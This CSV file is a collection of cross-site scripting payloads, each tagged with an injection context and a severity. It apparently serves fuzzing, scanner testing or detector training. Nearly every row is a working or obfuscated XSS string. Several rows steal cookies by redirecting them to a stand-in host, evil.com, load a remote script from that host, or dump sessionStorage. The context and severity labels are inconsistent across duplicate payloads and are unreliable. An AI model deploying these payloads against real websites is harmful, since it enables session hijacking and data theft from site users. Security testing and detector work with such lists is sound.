payload,context,severity
<video src=x onerror=alert(1)>,attribute_escape,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
onload='alert(1)',tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
<svg ONLoaD=ALeRt()>,attribute_escape,medium
<svgonload=alert(1)>,tag_injection,medium
<img/src=x onerror=confirm(1)//>,attribute_escape,medium
\x3cscript src=//evil.com/xss.js\x3e\x3c/script\x3e,script_injection,low
"javascript:void(document.location=""http://evil.com"")",js_uri,low
' ><img src=x onerror=confirm(1)>,attribute_escape,low
<Svg onloAD=alErt()>,tag_injection,medium
</tag><svg onload=alert(1)>,tag_injection,medium
&lt;details open ontoggle=alert(1)&gt;,dom_sink,medium
<audio src/onerror=alert(1)>,tag_injection,medium
"document.write(""<img src=x onload=alert(1)>"")",dom_sink,high
"eval(""alert(1)"")",dom_sink,high
<body onload=alert(1)>,event_handler,low
&quot; onerror=alert(1) x=&quot;,attribute_escape,low
javascript:confirm(1),script_injection,low
<img/src=x onerror=alert(1)//>,event_handler,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
<svg/onload=alert(1)>,attribute_escape,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
"{{constructor.constructor(	""alert(	1)"")(	)}}",template_injection,medium
<svgonload=alert(1)>,tag_injection,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
"""><SVG oNlOad=alErt(1)>",tag_injection,medium
"""></tag><svg onload=alert(1)>",tag_injection,medium
%3Csvg/onload=alert(1)%3E,tag_injection,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,low
javascript:confirm(1),js_uri,high
"%20""><svg onload=alert(1)>",tag_injection,medium
"\x3cscript\x3edocument.location=""http://evil.com/?c=""+document.cookie\x3c/script\x3e",script_injection,high
<svg/onload=alert(1)>,event_handler,high
<svg onload=alert(1)>,attribute_escape,medium
"""><svg onload=alert()>",tag_injection,medium
"<iframe src=""javascr/**/ipt:alert(1)"">",script_injection,medium
<SCRIPT>alert(document.domain)</SCRIPT>,script_injection,low
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
<svg////////onload=alert(1)>,tag_injection,medium
"\"" onerror=alert(1)//",attribute_escape,medium
alert(1),tag_injection,medium
"setTimeout(""alert(1)"",0)",dom_sink,high
"\""><img src=x onerror=al'+'ert(1)>",attribute_escape,high
<%= alert(1) %>,template_injection,high
<svg onload=alert(1)>,event_handler,high
<svg><a onload=alert(1)></a>,tag_injection,medium
<script>alert(1)</script>,script_injection,high
"\""><img src=x onerror=alert(1)>",template_injection,medium
confirm(),tag_injection,medium
<BODY ONLOAD=alert(’XSS’)>,tag_injection,medium
<svgonload=alert(1)>,tag_injection,medium
' onmouseover=alert(1) ',attribute_escape,high
"""><img src=x onerror=alert(1)>",attribute_escape,medium
<%= alert(1) %>,template_injection,medium
"""><svg onload=alert()>",tag_injection,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,attribute_escape,high
<svgonload=alert(1)>,tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,high
"alert(1))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
嘼img src=1 onchange=alert(1)嘾,attribute_escape,medium
"document.body.innerHTML=""<img src=x onerror=\u0061\u006cert(1)>""",dom_sink,high
javascript:alert(1),js_uri,low
{{_c.constructor('alert(1)')()}},script_injection,medium
<audio src/onerror=alert(1)>,tag_injection,medium
<ScRiPt>pRoMpT(1)</ScRiPt>,script_injection,low
<%= alert(1) %>,template_injection,low
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"<iframe src=""javaSCRIPT:alert(1)"">",tag_injection,medium
' ><img src=x onload=alert(1)>,template_injection,low
"<object data=""javascr/**/ipt:alert(1)"">",js_uri,high
<script>prompt(1)</script>,script_injection,high
<%= alert(1) %>,tag_injection,medium
{{7*7}},template_injection,medium
javascript:alert(1),js_uri,medium
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
"confirm(String.fromCharCode(88,83,83))//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
#{alert(1)},template_injection,high
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
<script>alert(document.domain)</script>,attribute_escape,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
"<embed src=""javascript:alert(1)"">",tag_injection,high
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
<svg/onload=alert(1)>,tag_injection,medium
onerror=alert(1);>,tag_injection,medium
onerror='alert(1)',tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",attribute_escape,high
<BODY ONLOAD=alert(8839)>,tag_injection,medium
"<iframe src=""javascript:confirm(1)"">",template_injection,medium
<video src=x onerror=alert(1)>,script_injection,high
"< script>alert(String.fromCharCode(88,83,83))</script>",attribute_escape,high
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
<%= al'+'ert(1) %>,template_injection,medium
<marquee onstart=alert(1)>,event_handler,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,low
<marquee onstart=alert(1)>,attribute_escape,low
<details open ontoggle=confirm(1)>,event_handler,medium
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
' onload=alert(1) x=',attribute_escape,medium
<scr/**/ipt>alert(document.domain)</scr/**/ipt>,template_injection,high
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",tag_injection,high
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
<script>d.innerHTML+='';</script>,script_injection,high
<video src=x onload=alert(1)>,attribute_escape,medium
<svgonload=alert(1)>,tag_injection,medium
alert(1),tag_injection,medium
<details open ontoggle=alert(1)>,event_handler,high
javascript:confirm(1),js_uri,low
"data:text/html,<script>alert(1)</script>",js_uri,low
"alert(1))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
</tag><svg onload=alert(1)>,attribute_escape,medium
"<script	>d.innerHTML+='';</script>//[""'`-->]]>]</div>",attribute_escape,high
"""+onblur=prompt(123)""+",attribute_escape,medium
onwheel='alert(1)',attribute_escape,medium
oNERrOR=AlERt(0);>,tag_injection,medium
<script>prompt(1)</script>,script_injection,medium
<body onload=alert(1)>,event_handler,low
"jAvAsCrIpT:VoId(dOcUmEnT.LoCaTiOn=""HtTp://eViL.CoM"")",script_injection,medium
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
%3Cimg%20src=xx%20onerror=alert(1)%3E,tag_injection,medium
"eval(""alert(1)"")",js_uri,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
<svg/onload=alert(1)>,tag_injection,low
<script>prompt(1)</script>,script_injection,medium
onerror=alert(0);>,tag_injection,medium
<svg on\u006co\u0061d=\u0061\u006cert(1)>,event_handler,medium
prompt(location.hash),tag_injection,medium
<svg><a onload=alert(1)></a>,tag_injection,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,high
"onbeforeinput=""alert(1)""",tag_injection,medium
<img/’onerror=alert(1) src=a>,tag_injection,medium
onerror=”alert(‘AnonKryptiQuz’),tag_injection,medium
"%20""><svg onload=alert(1)>",tag_injection,medium
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
setInterval('ale'+'rt(10)');,tag_injection,high
<video src=x onerror=alert(1)>,event_handler,high
<script>alert(1)</script>,tag_injection,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
<svg////////onload=alert(1)>,tag_injection,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
"""><svg onload=alert()>",tag_injection,medium
""" onload=alert(1) x=""",script_injection,high
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,tag_injection,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"onload=""alert(1)""",tag_injection,medium
<script ^__^>alert(String.fromCharCode(49))</script ^__^,attribute_escape,high
"</SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
' onload=alert(1) x=',attribute_escape,high
<script>alert(document.domain)</script>,js_uri,high
\u003e\u003cimg src=1 onerror=confirm`1`\u003e,attribute_escape,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
.alert(1);,tag_injection,medium
;alert(1);,tag_injection,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
' onmouseover=alert(1) ',attribute_escape,low
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
"lOcAtIoN=""jAvAsCrIpT:AlErT(1)""",tag_injection,medium
${confirm(1)},js_uri,high
innerHTML=location.hash>#<marquee>alert(1)</script>,tag_injection,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
<img src=x onerror=alert(1)>,tag_injection,high
<svg onload=alert()>,tag_injection,medium
javaSCRIPT:alert(document.domain),js_uri,low
alert(1),tag_injection,medium
"< script>d.innerHTML+='';</script>//[""'`-->]]>]</div>",script_injection,high
{{constructor.constructor(‘a=document;window.alert(1)’)()}},js_uri,medium
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"<object data=""javascript:alert(1)"">",attribute_escape,high
"<svg onload=""confirm(7)"">",tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",event_handler,high
""" onerror=alert(1) x=""",attribute_escape,low
< svgonload=alert(1)>,tag_injection,medium
"' onerror
=alert(	1) x
='",attribute_escape,medium
""" onload=alert(1) x=""",attribute_escape,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"eval(""alert(1)"")",dom_sink,high
javascript:confirm(1),js_uri,medium
prompt(9),tag_injection,medium
"mrco24""type=image src onerror=""alert(1)""",tag_injection,medium
"\"" onerror=alert(1)//",event_handler,high
"<embed src=""javaSCRIPT:alert(1)"">",script_injection,medium
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,low
""" onerror=alert(1) x=""",attribute_escape,medium
"\"" onerror=alert(1)//",attribute_escape,high
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
<svg/onload=alert(1)>,tag_injection,low
</tag><svg onload=alert(1)>,attribute_escape,medium
\' onload=alert(1)//,attribute_escape,high
""" onfocus=alert(1) autofocus=""",attribute_escape,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
onload='self.alert(1)',tag_injection,medium
\' onerror=alert(1)//,attribute_escape,medium
onload&#61;'alert(1)',tag_injection,medium
"OnLOaD=""AlERt(1)""",tag_injection,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,tag_injection,medium
onload='alert(1)',tag_injection,medium
<script>confirm(1)</script>,tag_injection,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
"<object data=""javascript:alert(1)"">",tag_injection,medium
onerror=alert;throw 23;,tag_injection,low
"setTimeout(""alert(1)"",0)",event_handler,low
"setTimeout(""alert(1)"",0)",dom_sink,high
"<details open ontoggle
=alert(	1)>",event_handler,medium
\x3cscript\x3eprompt(1)\x3c/script\x3e,script_injection,low
"location=""javascript:al'+'ert(1)""",dom_sink,high
j\u0061v\u0061script:confirm(1),js_uri,high
<img src=x onerror=alert(1)>,tag_injection,medium
<img/’onerror=alert(1) src=a>,tag_injection,medium
#{alert(1)},attribute_escape,low
"document.write(""<img src=x onerror=alert(1)>"")",dom_sink,high
""" onload=alert(1) x=""",script_injection,high
javascript:alert(1),js_uri,low
"""><svg onload=alert(1)>",tag_injection,medium
<body onload=alert(1)>,event_handler,high
confirm(),tag_injection,medium
"\"" onerror=alert(1)//",attribute_escape,low
<svg/onload=alert(1)>,event_handler,low
"eval(""alert(1)"")",dom_sink,high
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",tag_injection,high
"eval(""alert(1)"")",attribute_escape,low
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,high
"<SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>",tag_injection,high
"<script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
[].sort.call`${alert}23`,js_uri,low
"{{constructor.constructor('eval(atob(""YWxlcnQoMSk=""))')()}}",script_injection,high
<img src/onerror=prompt(8)>,tag_injection,medium
"data:text/html,<scr/**/ipt>alert(1)</scr/**/ipt>",js_uri,high
""" onload
=alert(	1) x
=""",attribute_escape,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
${alert(1)},template_injection,low
onload='confirm`1`',attribute_escape,medium
<%= alert(1) %>,template_injection,medium
' onmouseover=alert(1) ',attribute_escape,high
"location=""javascript:alert(1)""",event_handler,medium
<svgonload=alert(1)>,tag_injection,medium
<video src=x onload=alert(1)>,event_handler,medium
\' onerror=alert(1)//,attribute_escape,low
<svg/onload=confirm(1)>,tag_injection,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,medium
<script>confirm(document.domain)</script>,template_injection,medium
\' onerror=alert(1)//,attribute_escape,medium
"<video>d.innerHTML+='';</script>//[""'`-->]]>]</div>",tag_injection,high
onload=”self.alert(1),tag_injection,medium
"""><marquee alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
onerror='alert(1)',tag_injection,medium
\' onerror=alert(1)//,attribute_escape,low
onerror='alert(1)',tag_injection,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"\""><img src=x onerror=alert(1)>",attribute_escape,high
"oneRrOr=""AleRt(1)""",tag_injection,medium
嘼img src=1 onerror=alert(1)嘾,attribute_escape,medium
javascript:alert(1),js_uri,medium
onerror='alert(1)',tag_injection,medium
"<iframe src=""javaSCRIPT:alert(1)"">",script_injection,low
<details open ontoggle=alert(1)>,event_handler,low
"data:text/html,<script>alert(1)</script>",js_uri,medium
prompt(9),tag_injection,medium
<marquee onstart=alert(1)>,tag_injection,medium
.alert(1);,tag_injection,medium
-alert(1)-',tag_injection,medium
<img src=x onerror=alert(1)>,tag_injection,high
"?alert(1)"",",tag_injection,medium
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
"""><iframe>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
\' onerror=al'+'ert(1)//,attribute_escape,low
"<embed src=""javascript:alert(1)"">",tag_injection,low
"javascript:void(document.location=""http://evil.com"")",js_uri,medium
"""><script alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
-alert(1)-',tag_injection,medium
-alert(23)/,tag_injection,medium
"setTimeout(""alert(1)"",0)",dom_sink,low
"onload=""prompt`1`""",tag_injection,medium
${alert(1)},template_injection,medium
OnlOAD='AlERT(1)',tag_injection,medium
6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,tag_injection,medium
<script>confirm(1)</script>,script_injection,low
<script>alert(document.domain)</script>,script_injection,medium
"<svg onload=""confirm(7)"">",tag_injection,medium
onload='alert(1)',tag_injection,medium
alert(1);,tag_injection,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
' onmouseover=alert(1) ',attribute_escape,medium
"<embed src=""javascript:al'+'ert(1)"">",tag_injection,high
onload='alert(1)',tag_injection,medium
"onerror=""alert(1)""",tag_injection,medium
"location=""javascript:alert(1)""",event_handler,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
alert(1);,tag_injection,medium
"onerror=""window.alert(1)""",tag_injection,medium
"javascript:void(document.location=""http://evil.com"")",js_uri,high
<script>alert(document.domain)</script>,script_injection,low
"<iframe src=""javascript:confirm(1)"">",tag_injection,medium
<%= alert(1) %>,template_injection,low
"<embed src=""javascript:al'+'ert(1)"">",tag_injection,medium
onerror=alert(0);>,tag_injection,medium
<BODY ONLOAD=alert(‘XSS’)>,tag_injection,medium
' onmouseover=\u0061\u006cert(1) ',js_uri,low
#{aLeRt(1)},template_injection,low
\' onerror=alert(1)//,attribute_escape,low
"""><svg onload=alert(1)>",attribute_escape,medium
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
"<embed src=""javascript:alert(1)"">",tag_injection,low
"<svg onload=""confirm(7)"">",tag_injection,medium
"oNERROR=""alErT(1)""",tag_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
"""></tag><svg onload=alert(1)>",tag_injection,medium
<img src/onerror=alert(1)>,tag_injection,medium
"&lt;embed src=""javascript:alert(1)""&gt;",attribute_escape,high
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
prompt(9),tag_injection,medium
<script>confirm(1)</script>,script_injection,high
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
%3cimg onerror=alert(1) src=a%3e,tag_injection,medium
setInTeRvAl('aLE'+'rt(10)');,tag_injection,high
"document.write(""<img src=x onload=alert(1)>"")",template_injection,low
"OnerrOr=""AlErt(1)""",tag_injection,medium
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,low
<img src=x onload=alert(1)>,attribute_escape,high
"""><svg onload=alert()>",tag_injection,medium
<img src/onerror=prompt(8)>,tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,attribute_escape,high
javascript:alert(document.domain),js_uri,high
javascript:alert(document.domain),js_uri,medium
""" onerror=\u0061\u006cert(1) x=""",attribute_escape,medium
<img src=x onerror=alert(1)>,tag_injection,low
<svg/onload=confirm(1)>,attribute_escape,high
<%= alert(1) %>,template_injection,medium
alert(2),tag_injection,medium
"<embed src=""javaSCRIPT:alert(1)"">",tag_injection,medium
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
<img src=x onerror=alert(1)>,script_injection,medium
onload=”alert(‘AnonKryptiQuz’),tag_injection,medium
"onload=""alert(1)""",tag_injection,medium
{{7*7}},template_injection,high
<script>alert(1)</script>,script_injection,medium
"//"";alert(String.fromCharCode(88,83,83))",tag_injection,high
"""><img src=x onerror=alert(1)>",attribute_escape,low
"%3Ciframe src=""javascript:alert(1)""%3E",event_handler,low
<svg////////onload=alert(1)>,tag_injection,medium
confirm(),tag_injection,medium
<svg/onload=alert(1)>,event_handler,low
alert(1),tag_injection,medium
"location=""javascript:alert(1)""",dom_sink,low
onerror=alert(0);>,tag_injection,medium
${alert(	1)},template_injection,medium
onerror='alert(1)',tag_injection,medium
"eval(""alert(1)"")",dom_sink,medium
vbscript:confirm(1);,tag_injection,medium
<BODY ONLOAD=alert(8839)>,tag_injection,medium
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
"<iframe src=""javascript:alert(1)"">",tag_injection,low
<details open ontoggle=alert(1)>,attribute_escape,high
javascript:alert(1),dom_sink,medium
<script>confirm(1)</script>,script_injection,low
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
"<object data
=""javascript:alert(	1)"">",template_injection,high
"<svg onload=""confirm(7)"">",tag_injection,medium
""" onfocus=alert(1) autofocus=""",attribute_escape,low
' onmouseover=alert(1) ',attribute_escape,high
<img src/onerror=alert(1)>,tag_injection,medium
"""><sCRiPt>aLerT(StRInG.FrOMCHARCODE(88,83,83))</ScrIPt>",tag_injection,high
<SCRIPT>alert(1)</SCRIPT>,script_injection,low
"onerror=""alert('AnonKryptiQuz')""",tag_injection,medium
javascript:alert(1),js_uri,medium
<details open ontoggle=confirm(1)>,dom_sink,high
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
<%= alert(1) %>,js_uri,medium
%3Cscript%3Econfirm(1)%3C/script%3E,script_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
\' onerror=alert(1)//,attribute_escape,high
<img src/onerror=alert(1)>,tag_injection,medium
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"ev\u0061\u006c(""\u0061\u006cert(1)"")",dom_sink,high
"setTimeout(""alert(1)"",0)",js_uri,low
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,high
""" onload=al'+'ert(1) x=""",attribute_escape,high
<%= confirm(1) %>,template_injection,high
&quot; onerror=alert(1) x=&quot;,event_handler,high
"""><img src=x onerror=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",tag_injection,high
"<EmBeD SrC=""jAvAsCrIpT:AlErT(1)"">",tag_injection,medium
</tag><svg onload=alert(1)>,tag_injection,medium
ONErrOr=aleRt(0);>,tag_injection,medium
innerHTML=location.hash>#<script>alert(1)</script>,tag_injection,high
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",attribute_escape,high
confirm(),tag_injection,medium
"document.body.innerHTML=""<img src=x onerror=alert(1)>""",dom_sink,medium
<ScRiPt>pRoMpT(1)</ScRiPt>,script_injection,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
</tag><svg onload=alert(1)>,tag_injection,medium
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
<svg/on\u006co\u0061d=\u0061\u006cert(1)>,tag_injection,low
"//--></SCRIPT><SCRIPT>alert(String.fromCharCode(88,83,83));",tag_injection,high
"""><img src=x onbeforeinput=prompt(String.fromCharCode(100, 111, 99, 117, 109, 101, 110, 116, 46, 100, 111, 109, 97, 105, 110));>",attribute_escape,high
""" onload=alert(1) x=""",attribute_escape,high
嘼img src=1 onerror=alert(1)嘾,tag_injection,medium
${\u0061\u006cert(1)},attribute_escape,medium
' onmouseover=alert(1) ',attribute_escape,low
javascript:confirm(1),attribute_escape,low
""">< script>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"oNerrOr=""alErt(1)""",tag_injection,medium
alert(1);,tag_injection,medium
"onload=""alert(1)""",tag_injection,medium
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
"onerror=""alert(document.cookie)""",tag_injection,medium
<svg onload=alert()>,attribute_escape,medium
"<embed src=""javascript:alert(1)"">",tag_injection,medium
onload='alert(1)',tag_injection,medium
"<SCRIPT>document.location=""http://evil.com/?c=""+document.cookie</SCRIPT>",script_injection,medium
<img src=x onload=alert(1)>,tag_injection,medium
<image src/onerror=alert(1)>,tag_injection,medium
&quot; onerror=confirm(1) x=&quot;,attribute_escape,medium
"\""><img src=x onerror=alert(1)>",attribute_escape,medium
"prompt`1`)//"";confirm(String.fromCharCode(88,83,83))//--",tag_injection,high
"//"";ALeRT(sTRing.fROmChARCoDE(88,83,83))",tag_injection,high
"""><svg onload=alert()>",tag_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
"{{constructor.constructor(""alert(1)"")()}}",template_injection,high
<image src/onerror=alert(1)>,tag_injection,medium
\u003e\u003cimg src=1 oncut=alert(0)\u003e,attribute_escape,medium
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>",script_injection,medium
"eval(""alert(1)"")",attribute_escape,high
"<iframe src=""javaSCRIPT:alert(1)"">",tag_injection,medium
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",tag_injection,high
javascript:alert(document.domain),attribute_escape,medium
<IMG SRC=javascript:alert(document.cookie))>,js_uri,high
"""><svg/ onload=alert()>",tag_injection,medium
"eval(""alert(1)"")",dom_sink,high
javascript:confirm(1),js_uri,medium
"SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",tag_injection,high
""" onerror=alert(1) x=""",attribute_escape,low
{alert('document.cookie')},script_injection,high
<;BODY ONLOAD=alert(';XSS';)>;,tag_injection,medium
<script>confirm(1)</script>,script_injection,high
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",tag_injection,high
<%= alert(1) %>,event_handler,medium
sEtinTeRvAL('Ale'+'Rt(10)');,tag_injection,high
&quot; onerror=alert(1) x=&quot;,attribute_escape,high
"\"" onerror=alert(1)//",attribute_escape,medium
""" onerror=al'+'ert(1) x=""",event_handler,low
"<ScrIpT>D.iNNeRhtml+='';</ScrIPt>//[""'`-->]]>]</DIv>",tag_injection,high
"document.write(""<svg src=x onerror=alert(1)>"")",tag_injection,low
<svg><a onload=alert(1)></a>,tag_injection,medium
INNERhTml=locaTIoN.haSH>#<ScRiPt>aLerT(1)</scrIPt>,tag_injection,high
confirm(),tag_injection,medium
"window[""ev"".concat(""al"")](String.fromCharCode(97,108,101,114,116,40,49,41));",tag_injection,high
<script>confirm(document.domain)</script>,script_injection,low
alert(String.fromCharCode(88))</SCRIPT>,tag_injection,high
<SCRIPT>alert(document.domain)</SCRIPT>,event_handler,low
javascript:alert(document.domain),attribute_escape,high
"""><marquee>alert(String.fromCharCode(88,83,83))</script>",tag_injection,high
"""><svg onblur=alert()>",tag_injection,medium
\' onerror=alert(1)//,attribute_escape,high
""" oNlOaD=AlErT(1) x=""",template_injection,high
onfocus=”alert(‘AnonKryptiQuz’),tag_injection,medium
onerror='alert(1)',tag_injection,medium
onerror='alert(1)',tag_injection,medium
"' onerror
=alert(	1) x
='",attribute_escape,medium
"{{constructor.constructor(""al'+'ert(1)"")()}}",template_injection,medium
<img/src/onerror=alert(1),attribute_escape,medium
"data:text/html,<script>alert(1)</script>",js_uri,low
"""></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",tag_injection,high
${alert(1)},attribute_escape,medium
<iframe/onload=alert(0);>,attribute_escape,medium
"""><img src=x onload=alert(1)>",attribute_escape,high
<img src=asdf onerror=alert(JSON.stringify(sessionStorage))>,tag_injection,high
